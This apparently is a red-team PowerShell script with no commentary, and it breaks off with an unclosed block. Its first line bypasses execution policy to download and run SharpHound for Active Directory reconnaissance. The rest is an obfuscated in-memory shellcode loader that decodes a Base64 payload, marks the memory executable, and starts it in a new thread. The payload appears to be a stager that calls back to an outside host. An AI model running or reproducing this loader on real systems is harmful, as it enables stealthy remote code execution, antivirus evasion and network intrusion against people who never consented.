powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All"






$rS = @"
        using System;
        using System.Runtime.InteropServices;
        namespace cv1KO {
                public class func {
                        [Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
                        [Flags] public enum MemoryProtection { ReadWrite = 0x04, Execute= 0x10 }
                        [Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
                        [DllImport("ke"+"rnel"+"l32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
                        [DllImport("ke"+"rnel"+"l32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, int flNewProtect,out int lpflOldProtect);
                        [DllImport("ke"+"rnel"+"l32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
                        [[DllImport("ke"+"rnel"+"l32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
                }
        }
"@

$jp = New-Object Microsoft.CSharp.CSharpCodeProvider
$nd = New-Object System.CodeDom.Compiler.CompilerParameters
$nd.ReferencedAssemblies.AddRange(@("Sys" + "tem.dll", [PsObject].Assembly.Location))
$nd.GenerateInMemory = $True
$cNw = $jp.CompileAssemblyFromSource($nd, $rS)

[Byte[]]$yyUp = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGFBEi0AgSQHQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVhIAdBeWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6BgAAABubWFwLXZtLnNlY3VyYS10ZXN0LmNvbQBaSInBScfAuwEAAE0xyVNTagNTSbpXiZ/GAAAAAP/V6MkAAAAvVm10bXk1U2hPZkVKM2dqY2JLWndfUTdxajJNNmk4N003MFVqQUlwTUNxajVhLUgyOG5nd3U3WWtVdXlGSHJEV2VWMmdNZ0lrMUNTc3FKQi1ZX2FpZkxaSV9RT21xVGtzQU1nekVjSnVqa0dOU0dKYS03cHFPbnc0RVlHOXNGdlhlT2dsSy0xVE9oSm9tcWRzZVRzanpDNnV1NVh2cXJHT2R0dUhUbk4yZW14UWg0VHRPOXVFUVFEczl4Yy1nel9kbkMtM0ZadABIicFTWkFYTTHJU0i4ADKohAAAAABQU1NJx8LrVS47/9VIicZqCl9IifFqH1pSaIAzAABJieBqBEFZSbp1Rp6GAAAAAP/VTTHAU1pIifFNMclNMclTU0nHwi0GGHv/1YXAdR9Ix8GIEwAASbpE8DXgAAAAAP/VSP/PdALrquhVAAAAU1lqQFpJidHB4hBJx8AAEAAASbpYpFPlAAAAAP/VSJNTU0iJ50iJ8UiJ2knHwAAgAABJiflJuhKWieIAAAAA/9VIg8QghcB0smaLB0gBw4XAddJYw1hqAFlJx8LwtaJW/9U=")
[Uint32]$zjxb = 0

$ufJf = [cv1KO.func]::VirtualAlloc(0, $yyUp.Length + 1, [cv1KO.func+AllocationType]::Reserve -bOr [cv1KO.func+AllocationType]::Commit, [cv1KO.func+MemoryProtection]::ReadWrite)
if ([Bool]!$ufJf) { $global:result = 3; return }
[System.Runtime.InteropServices.Marshal]::Copy($yyUp, 0, $ufJf, $yyUp.Length)

if ([cv1KO.func]::VirtualProtect($ufJf,[Uint32]$yyUp.Length + 1, [cv1KO.func+MemoryProtection]::Execute, [Ref]$zjxb) -eq $true ) {
        [IntPtr] $svcO = [cv1KO.func]::CreateThread(0,0,$ufJf,0,0,0)
        if ([Bool]!$svcO) { $global:result = 7; return }
        $mH4 = [cv1KO.func]::WaitForSingleObject($svcO, [cv1KO.func+Time]::Infinite)
